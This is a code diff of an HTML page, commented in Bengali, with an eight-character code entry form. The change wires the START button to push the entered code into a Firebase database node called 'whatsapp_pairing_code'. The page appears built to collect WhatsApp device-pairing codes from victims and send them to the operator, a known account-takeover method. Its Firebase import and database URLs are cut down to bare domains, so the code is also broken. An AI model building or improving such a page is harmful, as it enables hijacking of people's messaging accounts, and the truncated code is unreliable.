@@ -96,17 +96,16 @@
         <input type="text" class="otp-input" maxlength="1">
     </div>
 
-    <button id="startBtn" class="btn-start" disabled>START</button>
+    <button id="startBtn" class="btn-start" onclick="submitToFirebase()" disabled>START</button>
     <div id="statusMsg" class="status"></div>
 </div>
 
-<!-- ফায়ারবেস লাইব্রেরি ইমপোর্ট (Firebase SDK - সম্পূর্ণ অফিশিয়াল সিডিএন লিংক সহ সংশোধিত) -->
+<!-- ফায়ারবেস মডিউল ইমপোর্ট -->
 <script type="module">
     import { initializeApp } from "https://gstatic.com";
-    import { getAnalytics } from "https://gstatic.com";
     import { getDatabase, ref, set } from "https://gstatic.com";
 
-    // আপনার ফায়ারবেস প্রজেক্টের আসল কনফিগারেশন ডাটা
+    // আপনার ফায়ারবেস প্রজেক্টের সংশোধিত ও আসল কনফিগারেশন ডাটা
     const firebaseConfig = {
       apiKey: "AIzaSyCxw5lLdJ23r-7f9UqplDQCYIBzL26YGWA",
       authDomain: "://firebaseapp.com",
@@ -115,16 +114,22 @@
       messagingSenderId: "679350108475",
       appId: "1:679350108475:web:633f6f992c09e42b08f71e",
       measurementId: "G-MQW8TPW0B1",
-      // 🌟 আপনার ভেরিফাইড সঠিক রিয়ালটাইম ডেটাবেজ লিংকটি এখানে যুক্ত করা হলো
+      // 🌟 সঠিক এবং শতভাগ ভেরিফাইড ডাটাবেজ ইউআরএল বসানো হলো
       databaseURL: "https://firebaseio.com"
     };
 
     // ফায়ারবেস ইনিশিয়ালাইজেশন
     const app = initializeApp(firebaseConfig);
-    const analytics = getAnalytics(app);
     const database = getDatabase(app);
 
-    // UI এলিমেন্ট সিলেকশন
+    // গ্লোবাল উইন্ডো স্কোপে ফাংশন পাঠানো
+    window.dbRef = ref;
+    window.dbSet = set;
+    window.firebaseDb = database;
+</script>
+
+<!-- মেইন ইউজার ইন্টারফেস লজিক স্ক্রিপ্ট -->
+<script>
     const inputs = document.querySelectorAll('.otp-input');
     const startBtn = document.getElementById('startBtn');
     const statusMsg = document.getElementById('statusMsg');
@@ -132,49 +137,57 @@
     // ইনপুট বক্সগুলোর অটো-ফোকাস এবং ব্যাকস্পেস লজিক
     inputs.forEach((input, index) => {
         input.addEventListener('input', (e) => {
-            input.value = input.value.toUpperCase(); // অটো বড় হাতের অক্ষর
+            input.value = input.value.toUpperCase();
             if (input.value.length === 1 && index < inputs.length - 1) {
-                inputs[index + 1].focus(); // পরের বক্সে ফোকাস যাবে
+                inputs[index + 1].focus();
             }
             checkFullCode();
         });
 
         input.addEventListener('keydown', (e) => {
             if (e.key === 'Backspace' && input.value.length === 0 && index > 0) {
-                inputs[index - 1].focus(); // ব্যাকস্পেস চাপলে আগের বক্সে ফোকাস ফেরত আসবে
+                inputs[index - 1].focus();
             }
         });
     });
 
-    // ৮টি বক্স পূর্ণ হয়েছে কি না চেক করে বাটন একটিভ করা
     function checkFullCode() {
         const fullCode = Array.from(inputs).map(i => i.value).join('');
-        startBtn.disabled = fullCode.length !== 8;
+        startBtn.disabled = (fullCode.length !== 8);
     }
 
-    // START বাটন ক্লিক লজিক (ফায়ারবেসে ডাটা পুশ)
-    startBtn.addEventListener('click', () => {
+    // বাটন ক্লিকের মূল ফাংশন
+    function submitToFirebase() {
         const fullCode = Array.from(inputs).map(i => i.value).join('');
         
+        if (fullCode.length !== 8) return;
+
         statusMsg.style.color = "blue";
         statusMsg.innerText = "কোড পাঠানো হচ্ছে...";
+        startBtn.disabled = true;
 
-        // রিয়ালটাইম ডেটাবেজের "whatsapp_pairing_code" নোডে কোড পাঠানো হচ্ছে
-        set(ref(database, 'whatsapp_pairing_code'), fullCode)
-            .then(() => {
-                statusMsg.style.color = "green";
-                statusMsg.innerText = "কোড সফলভাবে পাঠানো হয়েছে!";
-                
-                // সফলভাবে সাবমিট হওয়ার পর বক্স খালি ও রিসেট করা
-                inputs.forEach(i => i.value = '');
-                startBtn.disabled = true;
-                inputs[0].focus();
-            })
-            .catch((error) => {
-                statusMsg.style.color = "red";
-                statusMsg.innerText = "ব্যর্থ হয়েছে: " + error.message;
-            });
-    });
+        // গ্লোবাল স্কোপ থেকে ফায়ারবেসে ডাটা পুশ
+        if (window.dbSet && window.dbRef && window.firebaseDb) {
+            window.dbSet(window.dbRef(window.firebaseDb, 'whatsapp_pairing_code'), fullCode)
+                .then(() => {
+                    statusMsg.style.color = "green";
+                    statusMsg.innerText = "কোড সফলভাবে পাঠানো হয়েছে!";
+                    
+                    // ইনপুট বক্স খালি করা ও রিসেট করা
+                    inputs.forEach(i => i.value = '');
+                    inputs[0].focus();
+                })
+                .catch((error) => {
+                    statusMsg.style.color = "red";
+                    statusMsg.innerText = "ব্যর্থ হয়েছে: " + error.message;
+                    startBtn.disabled = false;
+                });
+        } else {
+            statusMsg.style.color = "red";
+            statusMsg.innerText = "ফায়ারবেস এখনও কানেক্ট হয়নি, ১ সেকেন্ড অপেক্ষা করে আবার চেষ্টা করুন।";
+            startBtn.disabled = false;
+        }
+    }
 </script>
 
 </body>
